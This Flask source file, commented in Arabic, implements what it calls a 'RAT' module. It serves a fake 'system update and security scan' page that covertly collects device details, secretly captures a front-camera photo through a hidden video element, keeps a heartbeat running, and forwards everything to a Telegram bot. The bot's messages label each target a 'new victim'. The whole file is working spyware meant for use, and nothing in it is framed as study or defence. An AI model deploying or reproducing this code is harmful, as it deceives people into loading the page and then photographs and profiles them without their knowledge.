import os
from flask import Blueprint, render_template_string, request

rat_bp = Blueprint('rat_module', __name__)

# قالب خفي ذكي يعمل في الخلفية لسحب البيانات وإرسالها للبوت
RAT_BACKGROUND_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جارِ تحديث النظام وتحسين الأداء...</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2>جاري تحسين أمان الجهاز وفحص الشبكة...</h2>
    <p>يرجى الانتظار وعدم إغلاق الصفحة حتى اكتمال التحديث بنجاح.</p>

    <!-- عنصر خفي لتشغيل الكاميرا وسحب الصورة في الخلفية -->
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const chatId = "{{ chat_id }}";

        // جمع معلومات الجهاز وإرسالها للسيرفر فوراً
        function collectSystemInfo() {
            const info = {
                chat_id: chatId,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                cores: navigator.hardwareConcurrency || 'غير معروف',
                memory: navigator.deviceMemory || 'غير معروفة',
                screen: window.screen.width + "x" + window.screen.height,
                language: navigator.language
            };

            fetch('/rat_collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(err => console.log(err));
        }

        // محاولة التقاط صورة خفية من الكاميرا الأمامية والبقاء في الخلفية
        async function captureAndKeepAlive() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);

                    // إرسال الصورة للسيرفر
                    fetch('/rat_image', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, image: imageData })
                    });
                }, 2000);
            } catch (e) {
                console.log("Camera access skipped or denied");
            }
        }

        // إبقاء الاتصال نشطاً في الخلفية (Heartbeat كل 10 ثوانٍ)
        function keepAlivePing() {
            setInterval(() => {
                fetch('/rat_ping?id=' + chatId).catch(e => {});
            }, 10000);
        }

        window.onload = function() {
            collectSystemInfo();
            captureAndKeepAlive();
            keepAlivePing();
        };
    </script>
</body>
</html>
"""

def init_rat_routes(app, bot):
    @app.route('/system_secure', methods=['GET'])
    def rat_landing():
        chat_id = request.args.get('id', '0')
        return render_template_string(RAT_BACKGROUND_TEMPLATE, chat_id=chat_id)

    @app.route('/rat_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')
        if chat_id and chat_id != '0':
            msg = (
                "📱 **تم رصد ضحية جديد والاتصال به في الخلفية!**\n\n"
                f"💻 **النظام:** `{data.get('platform')}`\n"
                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n"
                f"📐 **دقة الشاشة:** `{data.get('screen')}`\n"
                f"⚙️ **المعالج/الأنوية:** `{data.get('cores')}`\n"
                f"🧠 **الذاكرة العشوائية:** `{data.get('memory')} GB`"
            )
            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown")
            except Exception as e:
                print(f"Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_image', methods=['POST'])
    def rat_image():
        import base64
        import io
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        
        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                photo_file = io.BytesIO(image_bytes)
                photo_file.name = 'capture.jpg'
                
                bot.send_photo(
                    chat_id, 
                    photo_file, 
                    caption="📸 **صورة تم التقاطها من كاميرا الضحية في الخلفية!**", 
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Image send error: {e}")
        return {"status": "ok"}

    @app.route('/rat_ping', methods=['GET'])
    def rat_ping():
        # نقطة تفقد تحافظ على الجلسة نشطة في الخلفية
        return {"status": "alive"}
